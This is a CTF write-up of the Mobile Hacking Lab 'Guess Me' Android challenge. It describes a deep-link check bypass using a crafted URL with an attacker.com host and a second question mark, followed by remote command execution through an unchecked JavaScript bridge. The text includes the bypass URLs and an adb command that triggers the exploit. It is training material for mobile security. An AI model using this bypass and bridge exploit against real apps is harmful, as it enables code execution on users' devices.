---
title:  "Mobile Hacking Lab Guess Me Writeup"
date:   2024-01-22T16:35:00-0400
categories:
  - writeup
tags:
  - android
  - ctf
---


Hello everyone!
In this blog post , I will try to explain my solution steps for Guess Me challenge from Mobile Hacking Lab. 

## Static Analysis
When the application is opened, the user is greeted with a guessing game. When the randomly determined number is known correctly, no action is taken other than writing a congratulatory message on the screen.

Let's analyse code with jadx.
![](/assets/images_mhl_guessme/2.png)

We have onl-y 2 activities.

![](/assets/images_mhl_guessme/3.png)

During the MainActivity code analysis, it is seen that if the info button on the home page is pressed, it sends an intent for another activity (WebviewActivity), unlike other buttons.

## WebviewActivity Analysis

![](/assets/images_mhl_guessme/4.png)

For the webview created in the WebviewActivity activity, javascript code execution is first activated and then the MyJavaScriptInterface class is added to the webview object as a javascript interface with the name "AndroidBridge". This means that methods in the MyJavaScriptInterface class with @JavascriptInterface notation can be called from within the webview.
After the settings of the Webview object are made, the loadAssetIndex and handleDeepLink methods are called.

![](/assets/images_mhl_guessme/5.png)

In the loadAssetIndex method, the index.html file in the assets folder is loaded to be displayed in the webview.

![](/assets/images_mhl_guessme/6.png)

When the index.html file is examined, as mentioned, the current time is printed on the screen by calling the getTime function via the interface called AndroidBridge.

![](/assets/images_mhl_guessme/7.png)

In the handleDeepLink method, the data sent with the intent is processed and displayed in the webpage webview. It can be seen from the manifest file in the first screenshot that the WebviewActivity activity can be triggered with intent.
The URL obtained with the incoming intent is sent to the isValidDeepLink method to be checked. According to these controls,

- Url scheme: must be mhl or https.
- Url host: mobilehackinglab
- The parameter named “url” to be sent within the URL must end with the text “mobilehackinglab.com”.

After these checks, if it is a valid connection, the function returns the data in the "url" parameter. Then, by calling the loadDeepLink method with the URL received with the intent, the relevant web page is opened in the webview.

## Finding Vulnerability and Exploitation

If the methods in the AndroidBridge interface, which can be called from within the Webview, are examined closely, a problem is noticed.

![](/assets/images_mhl_guessme/8.png)

The argument sent to the getTime function, that is, the "Time" variable, is given as an argument to the exec function without any checking and the code is executed. Here, with any command sent to the getTime function, code execution can be performed on the target device with the permissions of the application. In order to do this, we need to upload our own malicious html file to the application. In order for our own file to be uploaded, the url in the intent we will send must be able to bypass the checks in the application.

```
https://mobilehackinglab?url=attacker.com
```

If a link address like this is sent with intent, the check will not be bypassed because the value in the url parameter does not end with “mobilehackinglab.com”.

```
-	https://mobilehackinglab?url=attacker.com#mobilehackinglab.com
-	https://mobilehackinglab?url=attacker.com&test=mobilehackinglab.com
-	…

```

In case of trying to bypass the control in the above ways, the control cannot be bypassed because the "url" parameter will be taken as attacker.com while parsing the url. It would be useful to analyze the source code of the "getQueryParameter" function used when getting the URL parameter.

[![](/assets/images_mhl_guessme/9.png)](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax)


[![](/assets/images_mhl_guessme/10.png)](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/net/Uri.java;l=1724;bpv=0;bpt=1)

In this function, the parameters are separated into their parts with the "&" sign, and then the relevant values are obtained by separating them with the "=" sign. Before the fragmentation process, the query part of the given link address is retrieved with the getEncodedQuery method.

![](/assets/images_mhl_guessme/11.png)

According to the information given in the source code. It returns the part between the "?" and "#" signs. This situation can also be seen when the details of the code are examined.

![](/assets/images_mhl_guessme/12.png)

As seen here, the url “?” It is divided starting from the question mark and the remaining part after the question mark is returned as the query part.

To bypass the check, a link address like this can be used:

```
https://mobilehackinglab?url=attacker.com?hack=mobilehackinglab.com
```

Although it is an incorrect URI in terms of Uri syntax, it successfully bypasses the checks and allows attacker.com to be loaded into the webview. Here is the situation that causes the checks to be skipped:
- While the Uri is divided into parts, the query part will be taken from the first question mark and will be returned as "url=attacker.com?hack=mobilehackinglab.com".
- Then, when dividing the query text into parameters, the url parameter will be accepted as “attacker.com?hack=mobilehackinglab.com” since there is no “&” sign in the query.
- Since the resulting query parameter contains the text "mobilehackinglab.com" at the end, the check will be bypassed.
- Finally, the loadDeepLink function tries to load the "attacker.com?hack=mobilehackinglab.com" value in the "url" parameter and attacker.com is loaded.

Python http server code created for the attack:

![](/assets/images_mhl_guessme/13.png)

HTML page that allows us to send commands to the GetTime function:

![](/assets/images_mhl_guessme/14.png)

The adb command used to test the attack:

```
adb shell am start -n com.mobilehackinglab.guessme/.WebviewActivity -d https://mobilehackinglab?url=10.0.3.2?hack=mobilehackinglab.com
```

Result:

![](/assets/images_mhl_guessme/15.png)


Thanks for reading! See you in next writeups 👋🏻👋🏻
